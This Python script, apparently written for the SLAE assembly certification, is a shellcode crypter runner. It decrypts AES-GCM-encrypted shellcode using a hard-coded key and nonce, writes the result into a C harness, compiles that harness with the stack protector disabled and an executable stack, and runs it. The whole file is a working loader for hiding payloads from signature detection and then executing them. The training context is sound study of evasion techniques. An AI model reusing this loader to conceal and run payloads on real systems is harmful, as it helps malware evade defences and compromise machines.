#!/usr/bin/python
# -*- coding: utf-8 -*-

# Filename: Runner.py
# Author: David Alvarez Robles (km0xu95)
# Website: https://blog.asturhackers.es

# Purpose: This assembly file has been created for completing the requirements
# of the SecurityTube Linux Assembly Expert (SLAE) certification

# Libraries import
from Crypto.Cipher import AES
import os
import time

# Encrypted shellcode from encryption routine. Do always include a raw string
encrypted_shellcode = r'\xa5\x44\x38\xf\xea\x31\xc6\x28\x2e\x27\x56\x31\x87\xe7\xb1\xf4\x50\x93\x6\x81\x88\x20\xff\x65\xea\xaa\x8c\xee\x6c\x23\xa1\x16\x7\xd5\xf0\x2e\x39\x92\x3a\x96\xfb\x95\x7e\x56\x71\x76\x66\xc4\x96'
# Encrypted shellcode conversion to bytearray from hexadecimal
bytes = encrypted_shellcode.split("\\x")[1:]
values = []
for byte in bytes:
        values.append(int(byte,16))
bytes = bytearray(values)

# Nonce from encryption routine. Do always include a raw string
nonce = r'\x49\xf1\x5f\xc0\xb9\x5d\xe6\xfa\x3f\x53\x15\xff\xa4\x86\x91\xc9'
# Nonce conversion to bytearray from hexadecimal
bytes2 = nonce.split("\\x")[1:]
values = []
for byte in bytes2:
        values.append(int(byte,16))
bytes2 = bytearray(values)

# Key definition used to encrypt the shellcode (16 bytes)
key = b'PoCPoCPoCPoCPoC!'
# AES encryption algorithm initialization (using key and GCM mode)
cipher = AES.new(key, AES.MODE_GCM, nonce=bytes2)

# Shellcode decryption
plaintext = cipher.decrypt(bytes)

# Shellcode conversion to bytearray
plaintext = bytearray(plaintext)
# Shellcode conversion to hexadecimal
output = ""
for byte in plaintext:
        output  += "\\x" + hex(byte).split("0x")[1]
plaintext = output

# C proof-of-concept file creation (shellcode.c) including decrypted shellcode
cfile = open("shellcode.c", "w")
cfile.write("""#include<stdio.h>
#include<string.h>

unsigned char code[] = \\
\"""")
cfile.close()
cfile = open("shellcode.c", "a")
cfile.write(plaintext)
cfile.write("""";

main()
{

        printf(\"Shellcode Length:  %d\\n\", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}""")
cfile.close()

# Log messages
print "[+] Shellcode recovered from encrypted one"
print "[*] Executing shellcode in 2 seconds..."
time.sleep(2)

# C proof-of-concept file compilation using GCC
os.system("gcc -fno-stack-protector -zexecstack shellcode.c -o shellcode")
# C proof-of-concept execution (shellcode execution)
os.system("./shellcode")
